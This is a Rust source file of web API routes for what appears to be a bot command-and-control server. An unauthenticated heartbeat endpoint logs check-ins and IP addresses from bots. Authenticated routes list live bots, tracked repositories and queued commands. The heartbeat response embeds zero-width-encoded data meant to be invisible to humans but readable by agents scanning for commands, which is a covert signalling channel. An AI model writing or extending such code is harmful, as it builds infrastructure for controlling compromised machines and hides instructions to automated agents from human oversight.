//! Lints (read-only monitoring) API routes + public heartbeat endpoint.

use axum::{
    extract::{Path, State},
    http::StatusCode,
    Json,
};
use std::sync::Arc;
use tracing::info;

use crate::{AppState, authenticate, json_err, json_ok, BOT_ALIVE_THRESHOLD, Role};

// ── Lints Endpoints ─────────────────────────────────────────────────────────

/// GET /api/lints/status
pub async fn lints_status(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let auth_hdr = headers.get("Authorization").and_then(|v| v.to_str().ok());
    let _role = authenticate(&state, auth_hdr)
        .await
        .map_err(|e| json_err(&e.to_string(), 401))?;

    let now = chrono::Utc::now().timestamp() as f64;
    let bots = state.bots.read().await;
    let alive_bots = bots
        .values()
        .filter(|b| (now - b.last_seen) < BOT_ALIVE_THRESHOLD)
        .count();

    let config = state.control_config.read().await;
    let alive_repos = config.repos.iter().filter(|r| r.alive).count();

    Ok(json_ok(serde_json::json!({
        "bots_total": bots.len(),
        "bots_alive": alive_bots,
        "repos_total": config.repos.len(),
        "repos_alive": alive_repos,
        "commands_queued": config.commands.len(),
    })))
}

/// GET /api/lints/bots
pub async fn lints_bots(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let auth_hdr = headers.get("Authorization").and_then(|v| v.to_str().ok());
    let _role = authenticate(&state, auth_hdr)
        .await
        .map_err(|e| json_err(&e.to_string(), 401))?;

    let bots = state.bots.read().await;
    let now = chrono::Utc::now().timestamp() as f64;

    let mut bot_list: Vec<serde_json::Value> = bots
        .iter()
        .map(|(id, info)| {
            serde_json::json!({
                "id": id,
                "ip": info.ip,
                "last_seen": info.last_seen,
                "hits": info.hits,
                "alive": (now - info.last_seen) < BOT_ALIVE_THRESHOLD,
            })
        })
        .collect();

    bot_list.sort_by(|a, b| {
        b["last_seen"].as_f64().unwrap_or(0.0)
            .partial_cmp(&a["last_seen"].as_f64().unwrap_or(0.0))
            .unwrap_or(std::cmp::Ordering::Equal)
    });

    Ok(json_ok(serde_json::json!({"bots": bot_list})))
}

/// GET /api/lints/repos
pub async fn lints_repos(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let auth_hdr = headers.get("Authorization").and_then(|v| v.to_str().ok());
    let _role = authenticate(&state, auth_hdr)
        .await
        .map_err(|e| json_err(&e.to_string(), 401))?;

    let config = state.control_config.read().await;
    let repos: Vec<serde_json::Value> = config
        .repos
        .iter()
        .enumerate()
        .map(|(i, r)| {
            serde_json::json!({
                "id": i,
                "platform": r.platform,
                "label": r.label(),
                "alive": r.alive,
            })
        })
        .collect();

    Ok(json_ok(serde_json::json!({"repos": repos})))
}

/// GET /api/lints/commands
pub async fn lints_commands(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let auth_hdr = headers.get("Authorization").and_then(|v| v.to_str().ok());
    let _role = authenticate(&state, auth_hdr)
        .await
        .map_err(|e| json_err(&e.to_string(), 401))?;

    let config = state.control_config.read().await;
    Ok(json_ok(serde_json::json!({
        "commands": config.commands,
        "total": config.commands.len(),
    })))
}

// ── Public: Heartbeat Receiver ──────────────────────────────────────────────

/// GET/POST /api/heartbeat/:bot_hash — Bot check-in (no auth required)
pub async fn heartbeat_receiver(
    State(state): State<Arc<AppState>>,
    Path(bot_hash): Path<String>,
    request: axum::extract::Request,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let ip = request
        .headers()
        .get("X-Forwarded-For")
        .and_then(|v| v.to_str().ok())
        .or_else(|| {
            request
                .headers()
                .get("X-Real-IP")
                .and_then(|v| v.to_str().ok())
        })
        .unwrap_or("unknown");

    info!("Heartbeat from bot {} (IP: {})", bot_hash, ip);
    state.record_heartbeat(&bot_hash, ip).await;

    // Embed ZW-encoded timestamp in response — invisible to humans,
    // readable by agents that scan heartbeat responses for commands.
    use arcticfox_core::zwcodec;
    let ts = chrono::Utc::now().timestamp();
    let ts_zw = zwcodec::encode(&ts.to_le_bytes());
    Ok(json_ok(serde_json::json!({
        "status": "ok",
        "ts": format!("{}{}", ts, ts_zw),
    })))
}

/// GET /api/auth/whoami — Token validation
pub async fn whoami(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let auth_hdr = headers.get("Authorization").and_then(|v| v.to_str().ok());
    let role = authenticate(&state, auth_hdr)
        .await
        .map_err(|e| json_err(&e.to_string(), 401))?;

    let role_str = match role {
        Role::Admin => "admin",
        Role::Lints => "lints",
    };

    Ok(json_ok(serde_json::json!({"role": role_str})))
}
